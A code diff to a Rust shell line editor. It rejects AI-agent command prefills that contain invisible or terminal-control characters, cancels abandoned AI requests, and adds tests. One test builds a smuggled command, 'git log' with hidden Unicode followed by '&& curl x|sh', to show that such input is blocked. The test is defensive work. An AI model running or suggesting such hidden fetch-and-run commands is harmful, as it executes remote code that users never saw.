@@ -1,6 +1,8 @@
 /// Line editor: raw mode, cursor movement, inline editing, integration with
 /// highlighting, suggestions, and completion. Supports multiline editing.
-use crate::ai::{AiConfig, AiContext, AiRequest, AiRequestKind, AiResponse, AiWorker};
+use crate::ai::{
+    AiConfig, AiContext, AiRequest, AiRequestKind, AiResponse, AiSubmitError, AiWorker,
+};
 use crate::completer::{self, common_prefix, Completion, CompletionKind};
 use crate::environment::ShellState;
 use crate::highlighter;
@@ -188,12 +190,7 @@ impl Editor {
         self.vi_pending = None;
         history.reset_position();
 
-        // Review-only prefill (agent insert path): the text lands in the
-        // editor exactly like typed input and is never submitted here.
-        if let Some(prefill) = state.pending_editor_insert.take() {
-            self.buffer.push_str(&prefill);
-            self.cursor = self.buffer.len();
-        }
+        self.take_editor_prefill(state);
 
         // Replay a byte stolen by swallow_enter_tail as if it had just been
         // typed. Non-printable stolen bytes are dropped: they cannot be
@@ -277,7 +274,10 @@ impl Editor {
         // Compute initial suggestion for proactive recommendations on empty buffer
         // (e.g., suggest "git push" right after "git commit")
         self.update_suggestion(history, state);
-        if self.suggestion.is_some() || !self.buffer.is_empty() {
+        // A status set before the first keystroke — a refused agent prefill is
+        // the one that leaves the buffer empty — has to be painted here or it
+        // is never seen: the next key press clears it.
+        if self.suggestion.is_some() || !self.buffer.is_empty() || self.ai_error.is_some() {
             self.repaint(state)?;
         }
 
@@ -547,6 +547,14 @@ impl Editor {
                 // submitted normally.
                 if let Some(prompt_text) = self.ai_generation_prompt().map(str::to_string) {
                     if self.trigger_ai_generate(&prompt_text, state, history) {
+                        return Ok(KeyAction::Continue);
+                    }
+                    // A trigger that failed with a reportable reason must not
+                    // fall through to submitting the text as an ordinary shell
+                    // comment: the next prompt clears the message before the
+                    // user could read it, which is the "keypress did nothing"
+                    // symptom itself.
+                    if self.ai_error.is_some() {
                         return Ok(KeyAction::Continue);
                     }
                 }
@@ -1644,9 +1652,45 @@ impl Editor {
         }
     }
 
-    /// End the editor's ownership of an in-flight request. The worker may keep
-    /// doing I/O, but its reply is no longer authorized to change editor state.
+    /// Move the agent's review-only prefill into the line buffer.
+    ///
+    /// This is the last boundary before untrusted text becomes an executable
+    /// line: the prompt renders the prefill as ordinary typed input and one
+    /// Enter runs it, with no `confirm_danger` RUN gate and no second
+    /// validation pass. Anything the review card had to escape in order to
+    /// display it would therefore be executed in a spelling the user never saw
+    /// — exactly the exact-review break `terminal_text` warns about — so it is
+    /// dropped and reported instead of inserted. `agent.rs` already refuses to
+    /// produce such a prefill; keeping the check here makes the invariant a
+    /// property of the seam rather than of its current only producer.
+    fn take_editor_prefill(&mut self, state: &mut ShellState) {
+        let Some(prefill) = state.pending_editor_insert.take() else {
+            return;
+        };
+        if crate::terminal_text::is_safe_inline(&prefill) {
+            self.buffer.push_str(&prefill);
+            self.cursor = self.buffer.len();
+        } else {
+            self.ai_error = Some(
+                "Agent insert rejected: invisible or terminal-control text in the command"
+                    .to_string(),
+            );
+        }
+    }
+
+    /// End an in-flight request — both the editor's ownership of the reply and
+    /// the work itself.
+    ///
+    /// Dropping the reply alone was the bug: the worker stayed connected to the
+    /// provider, billed, and holding the single in-flight slot until its own
+    /// 30 s read timeout, so a third `#`/Ctrl-F/Alt-E inside that window was
+    /// refused with nothing shown to the user. Cancelling through the request
+    /// id reaches the request wherever it is — still queued, or already in the
+    /// transport child, whose process group the worker then kills.
     fn invalidate_ai_request(&mut self, restore_input: bool) {
+        if let (Some(active), Some(worker)) = (self.active_ai_request, self.ai_worker.as_ref()) {
+            worker.cancel(active.request_id);
+        }
         self.active_ai_request = None;
         if restore_input {
             self.restore_ai_input();
@@ -1695,11 +1739,21 @@ impl Editor {
             prompt,
             context,
         };
-        if !self
-            .ai_worker
-            .as_ref()
-            .is_some_and(|worker| worker.request(request))
-        {
+        let Some(worker) = self.ai_worker.as_ref() else {
+            return false;
+        };
+        if let Err(error) = worker.request(request) {
+            // A trigger that silently does nothing is indistinguishable from a
+            // dead keybinding. Name which of the two happened.
+            self.ai_error = Some(
+                match error {
+                    AiSubmitError::Busy => {
+                        "AI error: the previous request is still stopping; press again"
+                    }
+                    AiSubmitError::Unavailable => "AI error: the AI worker is not running",
+                }
+                .to_string(),
+            );
             return false;
         }
         self.active_ai_request = Some(ActiveAiRequest { request_id, kind });
@@ -4087,5 +4141,103 @@ mod tests {
         assert_eq!(geometry.extra_rows, 2, "one wrap plus one hard newline");
         assert_eq!(geometry.cursor_row, 2);
         assert_eq!(geometry.cursor_col, 3);
+    }
+
+    /// The agent's `[i] insert` prefill lands in the buffer as ordinary typed
+    /// input and one Enter runs it, so the prompt has to show exactly what
+    /// Enter would execute. A code point the review card had to spell as an
+    /// escape renders as nothing here, which is the exact-review break
+    /// `terminal_text` exists to prevent.
+    #[test]
+    fn a_prefill_the_prompt_could_not_show_honestly_is_not_inserted() {
+        // Each of these passes jagent's own `validate_command`, whose
+        // invisible-character table stops at U+FFF8 and keeps the assigned
+        // interlinear annotation anchors that a terminal still shows as
+        // nothing.
+        for hidden in ['\u{fff9}', '\u{fffa}', '\u{fffb}'] {
+            let mut editor = Editor::new();
+            let mut state = ShellState::new(false);
+            let command = format!("git log --oneline{hidden} && curl x|sh");
+            state.pending_editor_insert = Some(command);
+
+            editor.take_editor_prefill(&mut state);
+
+            assert_eq!(
+                editor.buffer,
+                "",
+                "U+{:04X} reached the line buffer",
+                u32::from(hidden)
+            );
+            assert_eq!(editor.cursor, 0);
+            // Silently dropping it would be its own failure: the user chose
+            // [i] and is owed an explanation.
+            let error = editor.ai_error.as_deref().unwrap_or_default();
+            assert!(error.contains("Agent insert rejected"), "{error}");
+            assert!(crate::terminal_text::is_safe_inline(error), "{error}");
+            assert!(state.pending_editor_insert.is_none());
+        }
+    }
+
+    #[test]
+    fn an_ordinary_prefill_still_arrives_ready_to_edit() {
+        let mut editor = Editor::new();
+        let mut state = ShellState::new(false);
+        state.pending_editor_insert = Some("git log --oneline".to_string());
+
+        editor.take_editor_prefill(&mut state);
+
+        assert_eq!(editor.buffer, "git log --oneline");
+        assert_eq!(editor.cursor, editor.buffer.len());
+        assert_eq!(editor.ai_error, None);
+        assert!(state.pending_editor_insert.is_none());
+    }
+
+    /// Giving up on a request has to end the request, not just its reply.
+    /// Without this the worker stayed connected and billed until its own read
+    /// timeout, holding the one in-flight slot the whole time.
+    #[test]
+    fn abandoning_a_request_cancels_it_rather_than_leaving_it_running() {
+        let mut editor = Editor::new();
+        let (worker, _receiver) = crate::ai::AiWorker::detached_for_test();
+        let cancellation = worker.cancellation();
+        editor.ai_worker = Some(worker);
+        editor.active_ai_request = Some(ActiveAiRequest {
+            request_id: 7,
+            kind: AiRequestKind::Generate,
+        });
+
+        assert!(!cancellation.is_cancelled(7));
+        editor.invalidate_ai_request(false);
+
+        assert!(cancellation.is_cancelled(7));
+        assert!(editor.active_ai_request.is_none());
+        // Only through the abandoned request: a later one is untouched.
+        assert!(!cancellation.is_cancelled(8));
+    }
+
+    /// A trigger that cannot be submitted has to say so. Silently returning
+    /// false is how the third AI keypress inside a stalled request's window
+    /// came to do nothing at all with nothing shown.
+    #[test]
+    fn a_refused_ai_trigger_reports_why_instead_of_doing_nothing() {
+        let mut editor = Editor::new();
+        let state = ShellState::new(false);
+        let history = History::new(16);
+        let (worker, receiver) = crate::ai::AiWorker::detached_for_test();
+        editor.ai_worker = Some(worker);
+
+        // The single in-flight slot is already taken and nothing is draining it.
+        assert!(editor.trigger_ai_explain(&state, &history));
+        editor.buffer = "ls -la".to_string();
+        assert!(!editor.trigger_ai_explain(&state, &history));
+        let error = editor.ai_error.as_deref().unwrap_or_default();
+        assert!(error.contains("still stopping"), "{error}");
+
+        // A worker whose thread is gone is a different problem, and reads as one.
+        drop(receiver);
+        editor.ai_error = None;
+        assert!(!editor.trigger_ai_explain(&state, &history));
+        let error = editor.ai_error.as_deref().unwrap_or_default();
+        assert!(error.contains("not running"), "{error}");
     }
 }
